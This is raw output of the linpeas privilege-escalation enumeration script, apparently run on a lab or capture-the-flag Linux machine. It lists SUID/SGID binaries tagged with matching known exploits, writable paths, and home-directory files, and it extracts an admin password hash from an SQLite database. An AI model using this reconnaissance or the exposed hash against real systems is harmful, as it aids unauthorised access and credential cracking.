/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp          --->    HP-UX_10.20
/snap/core/6350/usr/bin/passwd          --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/snap/core/6350/usr/bin/sudo            --->    /sudo$
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd           --->    Apple_Mac_OSX_10.4.8
/snap/core/6531/bin/mount               --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/snap/core/6531/bin/ping
/snap/core/6531/bin/ping6
/snap/core/6531/bin/su
/snap/core/6531/bin/umount              --->    BSD/Linux[1996-08-13]
/snap/core/6531/usr/bin/chfn            --->    SuSE_9.3/10
/snap/core/6531/usr/bin/chsh
/snap/core/6531/usr/bin/gpasswd
/snap/core/6531/usr/bin/newgrp          --->    HP-UX_10.20
/snap/core/6531/usr/bin/passwd          --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/snap/core/6531/usr/bin/sudo            --->    /sudo$
/snap/core/6531/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6531/usr/lib/openssh/ssh-keysign
/snap/core/6531/usr/lib/snapd/snap-confine
/snap/core/6531/usr/sbin/pppd           --->    Apple_Mac_OSX_10.4.8

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/emacs/25.2/x86_64-linux-gnu/movemail           --->    Emacs
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/wall
/usr/bin/crontab
/usr/bin/expiry
/usr/bin/mlocate
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/usr/bin/at
/snap/core/6350/sbin/pam_extrausers_chkpwd
/snap/core/6350/sbin/unix_chkpwd
/snap/core/6350/usr/bin/chage
/snap/core/6350/usr/bin/crontab
/snap/core/6350/usr/bin/dotlockfile
/snap/core/6350/usr/bin/expiry
/snap/core/6350/usr/bin/mail-lock
/snap/core/6350/usr/bin/mail-touchlock
/snap/core/6350/usr/bin/mail-unlock
/snap/core/6350/usr/bin/ssh-agent
/snap/core/6350/usr/bin/wall
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6531/sbin/pam_extrausers_chkpwd
/snap/core/6531/sbin/unix_chkpwd
/snap/core/6531/usr/bin/chage
/snap/core/6531/usr/bin/crontab
/snap/core/6531/usr/bin/dotlockfile
/snap/core/6531/usr/bin/expiry
/snap/core/6531/usr/bin/mail-lock
/snap/core/6531/usr/bin/mail-touchlock
/snap/core/6531/usr/bin/mail-unlock
/snap/core/6531/usr/bin/ssh-agent
/snap/core/6531/usr/bin/wall
/snap/core/6531/usr/lib/snapd/snap-confine

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/mtr-packet = cap_net_raw+ep

[+] .sh files in path
/usr/bin/gettext.sh

[+] Files (scripts) in /etc/profile.d/
total 36
drwxr-xr-x   2 root root 4096 Mar 22  2019 .
drwxr-xr-x 101 root root 4096 Mar 22  2019 ..
-rw-r--r--   1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--   1 root root  825 Feb  3  2019 apps-bin-path.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 Oct  3  2018 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 Oct  3  2018 Z99-cloud-locale-test.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No
[+] Can I read root folder? ........... No

[+] Looking for root files in home dirs (limit 20)
/home

[+] Looking for root files in folders owned by me
-rw-r--r-- 1 root root 0 Jan  5 19:15 /var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/notify_on_release
-rw-r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/notify_on_release
-r--r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.events
-rw-r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.max.descendants
-r--r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cpu.stat
-rw-r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.type
-r--r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.stat
-r--r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.controllers
-rw-r--r-- 1 root root 0 Jan  5 19:14 /sys/fs/cgroup/unified/user.slice/user-1001.slice/user@1001.service/cgroup.max.depth

[+] Readable files belonging to root and readable by me but not world readable

[+] Files inside /home/r00t (limit 20)
total 36
drwxr-xr-x 5 r00t r00t 4096 Jan  5 19:13 .
drwxr-xr-x 5 root root 4096 Mar 22  2019 ..
-rw------- 1 r00t r00t    5 Jan  5 19:02 .bash_history
-rw-r--r-- 1 r00t r00t  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 .bashrc
drwx------ 2 r00t r00t 4096 Jan  5 19:02 .cache
drwx------ 3 r00t r00t 4096 Jan  5 19:14 .gnupg
drwxrwxr-x 3 r00t r00t 4096 Jan  5 19:13 .local
-rw-r--r-- 1 r00t r00t  807 Apr  4  2018 .profile

[+] Files inside others home (limit 20)
/home/lp1/.profile
/home/lp1/.bash_history
/home/lp1/.bash_logout
/home/lp1/.sudo_as_admin_successful
/home/lp1/.bashrc
/home/www/.profile
/home/www/.selected_editor
/home/www/.bash_history
/home/www/.npm/parseurl/1.3.2/package.tgz
/home/www/.npm/parseurl/1.3.2/package/package.json
/home/www/.npm/asynckit/0.4.0/package.tgz
/home/www/.npm/asynckit/0.4.0/package/package.json
/home/www/.npm/content-type/1.0.4/package.tgz
/home/www/.npm/content-type/1.0.4/package/package.json
/home/www/.npm/forever-agent/0.6.1/package.tgz
/home/www/.npm/forever-agent/0.6.1/package/package.json
/home/www/.npm/vary/1.1.2/package.tgz
/home/www/.npm/vary/1.1.2/package/package.json
/home/www/.npm/ini/1.3.5/package.tgz
/home/www/.npm/ini/1.3.5/package/package.json

[+] Looking for installed mail applications

[+] Mails (limit 50)

[+] Backup files?
-rw-r--r-- 1 root root 2765 Feb 14  2019 /etc/apt/sources.list.curtin.old
-rw-rw-r-- 1 www www 7138 Feb 13  2018 /home/www/api/node_modules/form-data/README.md.bak

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /home/www/api/utech.db.sqlite (limit 20)
  --> Found for interesting column names in users (output limit 10)
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
admin, 0d0ea5111e3c1def594c1684e3b9be84, 0


[+] Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Mar 19  2019 .
drwxr-xr-x 14 root root 4.0K Mar 19  2019 ..
drwxr-xr-x  5 root root 4.0K Mar 22  2019 html

/var/www/html:
total 60K
drwxr-xr-x 5 root root 4.0K Mar 22  2019 .
drwxr-xr-x 3 root root 4.0K Mar 19  2019 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 root root 2319 Apr  4  2018 /etc/bash.bashrc
-rw-r--r-- 1 lp1 lp1 807 Apr  4  2018 /home/lp1/.profile
-rw-r--r-- 1 lp1 lp1 0 Mar 19  2019 /home/lp1/.sudo_as_admin_successful
-rw-r--r-- 1 lp1 lp1 3771 Apr  4  2018 /home/lp1/.bashrc
-rw-r--r-- 1 r00t r00t 807 Apr  4  2018 /home/r00t/.profile
-rw------- 1 r00t r00t 5 Jan  5 19:02 /home/r00t/.bash_history
Looking for possible passwords inside /home/r00t/.bash_history

-rw-r--r-- 1 r00t r00t 3771 Apr  4  2018 /home/r00t/.bashrc
-rw-r--r-- 1 www www 807 Apr  4  2018 /home/www/.profile
-rw-r--r-- 1 www www 3771 Apr  4  2018 /home/www/.bashrc
-rw-r--r-- 1 root root 2889 Dec  4  2017 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 3106 Aug  6  2018 /usr/share/base-files/dot.bashrc
-rw-r--r-- 1 root root 802 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 2778 Aug 13  2017 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   401914      0 -rw-r--r--   1 landscape landscape        0 Feb 14  2019 /var/lib/landscape/.cleanup.user
   668769      4 -rw-r--r--   1 root      root          1531 Mar 19  2019 /var/cache/apparmor/.features
   663867      4 -rw-r--r--   1 lp1       lp1            220 Apr  4  2018 /home/lp1/.bash_logout
   668798      0 -rw-r--r--   1 lp1       lp1              0 Mar 19  2019 /home/lp1/.sudo_as_admin_successful
   917821      4 -rw-r--r--   1 r00t      r00t           220 Apr  4  2018 /home/r00t/.bash_logout
   929203      4 -rw-rw-r--   1 www       www             73 Mar 22  2019 /home/www/.selected_editor
   928921     20 -rw-rw-r--   1 www       www          17776 Mar 22  2019 /home/www/.npm/registry.npmjs.org/parseurl/.cache.json
  1186027     16 -rw-rw-r--   1 www       www          16368 Mar 22  2019 /home/www/.npm/registry.npmjs.org/asynckit/.cache.json
   928906     16 -rw-rw-r--   1 www       www          12715 Mar 22  2019 /home/www/.npm/registry.npmjs.org/content-type/.cache.json
  1185876      8 -rw-rw-r--   1 www       www           8138 Mar 22  2019 /home/www/.npm/registry.npmjs.org/forever-agent/.cache.json
   928876     16 -rw-rw-r--   1 www       www          13967 Mar 22  2019 /home/www/.npm/registry.npmjs.org/vary/.cache.json
  1185735     20 -rw-rw-r--   1 www       www          17219 Mar 22  2019 /home/www/.npm/registry.npmjs.org/ini/.cache.json
  1185892    100 -rw-rw-r--   1 www       www          99189 Mar 22  2019 /home/www/.npm/registry.npmjs.org/har-validator/.cache.json
  1186164      8 -rw-rw-r--   1 www       www           7180 Mar 22  2019 /home/www/.npm/registry.npmjs.org/jsbn/.cache.json
  1185884     40 -rw-rw-r--   1 www       www          40067 Mar 22  2019 /home/www/.npm/registry.npmjs.org/uuid/.cache.json
   928848     64 -rw-rw-r--   1 www       www          63862 Mar 22  2019 /home/www/.npm/registry.npmjs.org/cors/.cache.json
  1185357     24 -rw-rw-r--   1 www       www          22359 Mar 22  2019 /home/www/.npm/registry.npmjs.org/detect-libc/.cache.json
  1185662     16 -rw-rw-r--   1 www       www          12420 Mar 22  2019 /home/www/.npm/registry.npmjs.org/wide-align/.cache.json
  1185519     28 -rw-rw-r--   1 www       www          28623 Mar 22  2019 /home/www/.npm/registry.npmjs.org/brace-expansion/.cache.json
  1185606     24 -rw-rw-r--   1 www       www          21825 Mar 22  2019 /home/www/.npm/registry.npmjs.org/string_decoder/.cache.json
  1185898     80 -rw-rw-r--   1 www       www          78462 Mar 22  2019 /home/www/.npm/registry.npmjs.org/form-data/.cache.json
  1186018     16 -rw-rw-r--   1 www       www          13451 Mar 22  2019 /home/www/.npm/registry.npmjs.org/delayed-stream/.cache.json
   928931    100 -rw-rw-r--   1 www       www         100197 Mar 22  2019 /home/www/.npm/registry.npmjs.org/serve-static/.cache.json
   928900     12 -rw-rw-r--   1 www       www          10549 Mar 22  2019 /home/www/.npm/registry.npmjs.org/methods/.cache.json
  1185743     28 -rw-rw-r--   1 www       www          28589 Mar 22  2019 /home/www/.npm/registry.npmjs.org/deep-extend/.cache.json
   928890     20 -rw-rw-r--   1 www       www          17564 Mar 22  2019 /home/www/.npm/registry.npmjs.org/array-flatten/.cache.json
  1185222     20 -rw-rw-r--   1 www       www          17400 Mar 22  2019 /home/www/.npm/registry.npmjs.org/safer-buffer/.cache.json
  1185276      8 -rw-rw-r--   1 www       www           6063 Mar 22  2019 /home/www/.npm/registry.npmjs.org/destroy/.cache.json
   928897     12 -rw-rw-r--   1 www       www          10027 Mar 22  2019 /home/www/.npm/registry.npmjs.org/encodeurl/.cache.json
  1185354     64 -rw-rw-r--   1 www       www          62439 Mar 22  2019 /home/www/.npm/registry.npmjs.org/rc/.cache.json
  1185645      8 -rw-rw-r--   1 www       www           6490 Mar 22  2019 /home/www/.npm/registry.npmjs.org/has-unicode/.cache.json
  1185865      8 -rw-rw-r--   1 www       www           5090 Mar 22  2019 /home/www/.npm/registry.npmjs.org/aws-sign2/.cache.json
  1186159     52 -rw-rw-r--   1 www       www          53051 Mar 22  2019 /home/www/.npm/registry.npmjs.org/dashdash/.cache.json
  1186054     16 -rw-rw-r--   1 www       www          13970 Mar 22  2019 /home/www/.npm/registry.npmjs.org/fast-deep-equal/.cache.json
  1185213     12 -rw-rw-r--   1 www       www           8924 Mar 22  2019 /home/www/.npm/registry.npmjs.org/inherits/.cache.json
  1186090     44 -rw-rw-r--   1 www       www          42263 Mar 22  2019 /home/www/.npm/registry.npmjs.org/punycode/.cache.json
   928850    180 -rw-rw-r--   1 www       www         182403 Mar 22  2019 /home/www/.npm/registry.npmjs.org/sqlite3/.cache.json
  1185738     20 -rw-rw-r--   1 www       www          17859 Mar 22  2019 /home/www/.npm/registry.npmjs.org/strip-json-comments/.cache.json
  1185872     16 -rw-rw-r--   1 www       www          13187 Mar 22  2019 /home/www/.npm/registry.npmjs.org/oauth-sign/.cache.json
  1185894     16 -rw-rw-r--   1 www       www          14522 Mar 22  2019 /home/www/.npm/registry.npmjs.org/caseless/.cache.json
  1185494     16 -rw-rw-r--   1 www       www          15417 Mar 22  2019 /home/www/.npm/registry.npmjs.org/npm-bundled/.cache.json
  1185348     36 -rw-rw-r--   1 www       www          35361 Mar 22  2019 /home/www/.npm/registry.npmjs.org/npm-packlist/.cache.json
  1186126     12 -rw-rw-r--   1 www       www           9901 Mar 22  2019 /home/www/.npm/registry.npmjs.org/extsprintf/.cache.json
   928936     64 -rw-rw-r--   1 www       www          63024 Mar 22  2019 /home/www/.npm/registry.npmjs.org/type-is/.cache.json
  1186161      8 -rw-rw-r--   1 www       www           7767 Mar 22  2019 /home/www/.npm/registry.npmjs.org/ecc-jsbn/.cache.json
  1185173     52 -rw-rw-r--   1 www       www          50325 Mar 22  2019 /home/www/.npm/registry.npmjs.org/http-errors/.cache.json
  1185899     76 -rw-rw-r--   1 www       www          75215 Mar 22  2019 /home/www/.npm/registry.npmjs.org/aws4/.cache.json
  1185296     28 -rw-rw-r--   1 www       www          24750 Mar 22  2019 /home/www/.npm/registry.npmjs.org/is-buffer/.cache.json
  1185294      4 -rw-rw-r--   1 www       www           3649 Mar 22  2019 /home/www/.npm/registry.npmjs.org/crypt/.cache.json
   929052      8 -rw-rw-r--   1 www       www           4800 Mar 22  2019 /home/www/.npm/registry.npmjs.org/utils-merge/.cache.json
   928912     12 -rw-rw-r--   1 www       www          10141 Mar 22  2019 /home/www/.npm/registry.npmjs.org/setprototypeof/.cache.json
  1185159    100 -rw-rw-r--   1 www       www          99801 Mar 22  2019 /home/www/.npm/registry.npmjs.org/mime-db/.cache.json
   928923     36 -rw-rw-r--   1 www       www          33749 Mar 22  2019 /home/www/.npm/registry.npmjs.org/safe-buffer/.cache.json
  1185880     28 -rw-rw-r--   1 www       www          27388 Mar 22  2019 /home/www/.npm/registry.npmjs.org/http-signature/.cache.json
  1185609     12 -rw-rw-r--   1 www       www          10675 Mar 22  2019 /home/www/.npm/registry.npmjs.org/process-nextick-args/.cache.json
  1186040    700 -rw-rw-r--   1 www       www         714296 Mar 22  2019 /home/www/.npm/registry.npmjs.org/ajv/.cache.json
  1186155      8 -rw-rw-r--   1 www       www           5736 Mar 22  2019 /home/www/.npm/registry.npmjs.org/bcrypt-pbkdf/.cache.json
  1185889      8 -rw-rw-r--   1 www       www           7456 Mar 22  2019 /home/www/.npm/registry.npmjs.org/json-stringify-safe/.cache.json
  1185820     12 -rw-rw-r--   1 www       www           8904 Mar 22  2019 /home/www/.npm/registry.npmjs.org/chownr/.cache.json
  1186220     72 -rw-rw-r--   1 www       www          69963 Mar 22  2019 /home/www/.npm/registry.npmjs.org/psl/.cache.json
  1185447     64 -rw-rw-r--   1 www       www          63600 Mar 22  2019 /home/www/.npm/registry.npmjs.org/sax/.cache.json
  1185651     20 -rw-rw-r--   1 www       www          19630 Mar 22  2019 /home/www/.npm/registry.npmjs.org/signal-exit/.cache.json
   928846     12 -rw-rw-r--   1 www       www          12276 Mar 22  2019 /home/www/.npm/registry.npmjs.org/md5/.cache.json
   929056     80 -rw-rw-r--   1 www       www          80478 Mar 22  2019 /home/www/.npm/registry.npmjs.org/mime-types/.cache.json
  1185168     84 -rw-rw-r--   1 www       www          85295 Mar 22  2019 /home/www/.npm/registry.npmjs.org/iconv-lite/.cache.json
  1185829     20 -rw-rw-r--   1 www       www          20071 Mar 22  2019 /home/www/.npm/registry.npmjs.org/minizlib/.cache.json
  1185717      4 -rw-rw-r--   1 www       www           4024 Mar 22  2019 /home/www/.npm/registry.npmjs.org/number-is-nan/.cache.json
  1185546     12 -rw-rw-r--   1 www       www           8764 Mar 22  2019 /home/www/.npm/registry.npmjs.org/console-control-strings/.cache.json
  1185699      8 -rw-rw-r--   1 www       www           5519 Mar 22  2019 /home/www/.npm/registry.npmjs.org/code-point-at/.cache.json
   928947     28 -rw-rw-r--   1 www       www          25912 Mar 22  2019 /home/www/.npm/registry.npmjs.org/etag/.cache.json

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxrwxr-x 1 r00t r00t 134050 Jan  5 19:13 /tmp/linpeas.sh
-rw-r--r-- 1 root root 426 Mar 19  2019 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 11327 Mar 22  2019 /var/backups/apt.extended_states.0

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/screen
/run/screen/S-r00t
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/snap/core/6350/run/lock
/snap/core/6350/tmp
/snap/core/6350/var/tmp
/snap/core/6531/run/lock
/snap/core/6531/tmp
/snap/core/6531/var/tmp
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/inetd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-6350.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snap-core-6531.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
/var/lib/php/sessions
/var/tmp
/dev/mqueue/linpeas.txt
/tmp/linpeas.sh

[+] Searching passwords in config PHP files

[+] Finding IPs inside logs (limit 100)
      9 /var/log/cloud-init-output.log:10.0.2.15
      9 /var/log/cloud-init-output.log:10.0.2.0
      8 /var/log/installer/subiquity-debug.log:10.0.2.15
      8 /var/log/dpkg.log:6.18.04.1
      8 /var/log/dpkg.log:0.19.8.1
      7 /var/log/dpkg.log:018.09.18.1
      7 /var/log/apt/history.log:0.18.04.2
     70 /var/log/dpkg.log:1.19.0.5
     70 /var/log/dpkg.log:0.18.04.2
      6 /var/log/installer/subiquity-debug.log:10.0.2.0
      4 /var/log/installer/installer-journal.txt:0.18.04.2
      4 /var/log/installer/installer-journal.txt:0.18.04.1
      4 /var/log/apt/history.log:2.18.04.1
      4 /var/log/apt/history.log:1.19.0.5
      4 /var/log/apt/history.log:0.18.04.4
     44 /var/log/cloud-init-output.log:0.0.0.0
      3 /var/log/installer/subiquity-debug.log:127.0.0.1
      3 /var/log/installer/subiquity-debug.log:10.0.2.255
      3 /var/log/installer/installer-journal.txt:91.189.89.199
      3 /var/log/apt/history.log:7.18.04.1
      3 /var/log/apt/history.log:4.15.0.46
     38 /var/log/dpkg.log:2.18.04.1
     37 /var/log/dpkg.log:0.18.04.4
      2 /var/log/wtmp:10.9.3.166
      2 /var/log/journal/8395ee3c2022408bba17501034058b07/user-1001.journal:10.9.3.166
      2 /var/log/installer/subiquity-debug.log:127.0.0.0
      2 /var/log/installer/installer-journal.txt:2.37.1.1
      2 /var/log/installer/installer-journal.txt:10.0.2.2
      2 /var/log/installer/installer-journal.txt:10.0.2.15
      2 /var/log/cloud-init-output.log:255.255.240.0
      2 /var/log/cloud-init-output.log:255.255.0.0
      2 /var/log/cloud-init-output.log:172.30.16.1
      2 /var/log/cloud-init-output.log:10.10.0.1
      2 /var/log/bootstrap.log:0.99.7.1
      2 /var/log/apt/history.log:2.37.1.1
      2 /var/log/apt/history.log:18.04.11.9
      2 /var/log/apt/history.log:1.18.04.8
      2 /var/log/apt/history.log:0.96.24.32
     26 /var/log/dpkg.log:7.18.04.1
     24 /var/log/dpkg.log:4.15.0.46
      1 /var/log/lastlog:10.9.3.166
      1 /var/log/installer/subiquity-debug.log:127.255.255.255
      1 /var/log/installer/subiquity-debug.log:10.0.2.2
      1 /var/log/cloud-init-output.log:172.30.24.75
      1 /var/log/cloud-init-output.log:172.30.16.0
      1 /var/log/cloud-init-output.log:10.10.253.17
      1 /var/log/cloud-init-output.log:10.10.0.0
      1 /var/log/apt/history.log:6.18.04.1
      1 /var/log/apt/history.log:3.192.1.5
      1 /var/log/apt/history.log:2.18.04.3
      1 /var/log/apt/history.log:2.0.10.4
      1 /var/log/apt/history.log:1.18.04.9
      1 /var/log/apt/history.log:0.19.8.1
      1 /var/log/apt/history.log:018.09.18.1
     19 /var/log/bootstrap.log:1.19.0.5
     18 /var/log/dpkg.log:3.192.1.5
     18 /var/log/cloud-init-output.log:255.255.255.0
     18 /var/log/cloud-init-output.log:10.0.2.2
     17 /var/log/dpkg.log:2.37.1.1
     17 /var/log/dpkg.log:1.18.04.8
     17 /var/log/dpkg.log:0.96.24.32
     16 /var/log/dpkg.log:18.04.11.9
     16 /var/log/apt/history.log:0.18.04.1
    130 /var/log/dpkg.log:0.18.04.1
     12 /var/log/installer/installer-journal.txt:4.15.0.46
     11 /var/log/dpkg.log:2.18.04.3
     11 /var/log/dpkg.log:2.0.10.4
     11 /var/log/dpkg.log:1.18.04.9
     11 /var/log/cloud-init-output.log:255.255.255.255
     11 /var/log/cloud-init-output.log:255.0.0.0
     11 /var/log/cloud-init-output.log:127.0.0.1

[+] Finding passwords inside logs (limit 100)
Binary file /var/log/cloud-init.log matches
Binary file /var/log/journal/8395ee3c2022408bba17501034058b07/user-1001.journal matches
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
/var/log/cloud-init.log:2019-03-19 14:42:36,533 - ssh_util.py[DEBUG]: line 123: option PasswordAuthentication added with yes
/var/log/cloud-init.log:2019-03-19 14:42:36,612 - cc_set_passwords.py[DEBUG]: Restarted the ssh daemon.
/var/log/cloud-init.log:2019-03-22 12:39:18,502 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-03-22 13:56:43,927 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-03-22 15:47:23,365 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-03-22 17:06:24,139 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/cloud-init.log:2019-03-22 17:16:00,416 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
/var/log/dpkg.log:2019-02-14 09:49:32 configure base-passwd:amd64 3.5.44 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 install base-passwd:amd64 <none> 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2019-02-14 09:49:32 status half-installed base-passwd:amd64 3.5.44
